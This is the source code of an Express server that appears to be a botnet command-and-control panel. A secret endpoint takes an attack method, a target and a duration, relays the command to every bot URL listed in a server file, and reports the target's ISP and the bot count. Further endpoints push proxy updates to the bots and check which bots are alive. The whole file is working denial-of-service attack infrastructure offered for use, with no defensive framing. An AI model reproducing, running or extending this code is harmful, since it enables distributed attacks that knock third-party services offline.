const express = require('express');
const axios = require('axios');
const fs = require('fs/promises');
const path = require('path');

const app = express();
const port = 3000;
const maxAttackTime = 30000;

let lastAttackTime = 0;

let serverList = [];

async function readFiles() {
  try {
    const data = await fs.readFile('./server.js', 'utf8');
    serverList = JSON.parse(data);
  } catch (error) {
    console.error('Error reading files:', error);
    process.exit(1);
  }
}

							
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'dash.html'));
});

app.get('/home', (req, res) => {
  res.sendFile(path.join(__dirname, 'dash.html'));
});

app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'dash.html'));
});

app.get('/panel', (req, res) => {
  res.sendFile(path.join(__dirname, 'panel.html'));
});

app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'login.html'));
});

app.get('/pakcik.js', (req, res) => {
  res.sendFile(path.join(__dirname, 'pakcik.js'));
});

app.get('/starsxteam6969', async (req, res) => {
  const { methods, target, time } = req.query;

  if (!methods || !target || !time || isNaN(parseInt(time)) || parseInt(time) <= 0 || parseInt(time) > maxAttackTime) {
    return res.status(400).json({ error: 'Invalid parameters' });
  }

  const currentTime = Date.now();

  if (currentTime - lastAttackTime < maxAttackTime) {
    const timeRemaining = maxAttackTime - (currentTime - lastAttackTime);
    return res.status(403).json({ error: `Please wait ${timeRemaining} milliseconds before launching a new attack` });
  }

  lastAttackTime = currentTime;

  try {
    let apiResponses = 0;

    for (const apiUrl of serverList) {
      const attackUrl = `${apiUrl}/permen?methods=${methods}&target=${target}&time=${time}`;

      try {
        await axios.get(attackUrl, { timeout: 3000 });
        apiResponses++;
        console.clear();
        console.log(`New Attack Detected`);
        console.log(`Methods: ${methods}`);
        console.log(`Target: ${target}`);
        console.log(`Connected Bot: ${apiResponses}`);
      } catch (error) {
        console.error(`Error fetching data from API (${apiUrl}): ${error.message}`);
      }
    }
    const startTime = Date.now();
    const endTime = Date.now();
    const cleanedTarget = target.replace(/^(https?:\/\/)/, '');
    const tts = (endTime - startTime) / 1000;

    fetchIPAPI(cleanedTarget)
      .then(({ isp, query }) => {
        const attackDetails = {
          Creator: 'PermenMD',
          Target: cleanedTarget,
          Duration: time,
          Methods: methods,
          TTS: tts.toFixed(2),
          ISP: isp,
          Query: query,
          Botnet: apiResponses,
        };

        res.header('Content-Type', 'application/json');
        res.send(JSON.stringify(attackDetails, null, 2));
      })
      .catch((error) => {
        console.error('Error fetching IP-API data:', error);
        res.status(500).json({ error: 'Internal Server Error' });
      });
  } catch (error) {
    console.error('Error executing API requests:', error);
    userCredential.concurrentAttacks--;
    res.status(500).json({ error: 'Internal Server Error' });
  }
});

app.get('/proxy', async (req, res) => {
  const { update } = req.query;

  if (!update || update.toLowerCase() !== 'yes') {
    return res.status(400).json({ error: 'Invalid parameters' });
  }

  try {
    let apiResponses = 0;

    for (const apiUrl of serverList) {
      const updateUrl = `${apiUrl}/proxy?update=yes`;

      try {
        await axios.get(updateUrl, { timeout: 3000 });
        apiResponses++;
        console.clear();
        console.log(`Update process started at ${apiUrl}`);
        console.log(`Connected Bot: ${apiResponses}`);
      } catch (error) {
        console.error(`Error fetching data from API (${apiUrl}): ${error.message}`);
      }
    }

    res.status(200).json({ message: `Update process started at ${serverList.length} bots` });
  } catch (error) {
    console.error('Error executing update requests:', error);
    res.status(500).json({ error: 'Internal Server Error' });
  }
});

app.get('/server', async (req, res) => {
  const { check, add } = req.query;

  if (check && check.toLowerCase() === 'yes') {
    const response = {
      Alive: [],
      Dead: []
    };

    try {
      const requests = serverList.map(apiUrl => axios.get(apiUrl, { timeout: 10000 })
        .then(() => apiUrl)
        .catch(() => null));

      const results = await Promise.allSettled(requests);

      results.forEach((result, index) => {
        if (result.status === 'fulfilled' && result.value) {
          response.Alive.push(result.value);
        } else {
          response.Dead.push(serverList[index]);
        }
      });

      return res.status(200).json(response);
    } catch (error) {
      console.error('Error checking server status:', error);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
  } else if (add) {
  } else {
    return res.status(400).json({ error: 'Invalid parameters' });
  }
});



function fetchIPAPI(cleanedTarget) {
  return axios.get(`http://ip-api.com/json/${cleanedTarget}?fields=isp,query,as`)
    .then(({ data }) => ({ isp: data.isp, query: data.query }))
    .catch((error) => {
      throw new Error(`Error fetching IP-API data: ${error.message}`);
    });
}

app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
  setInterval(readFiles, 1000);
});


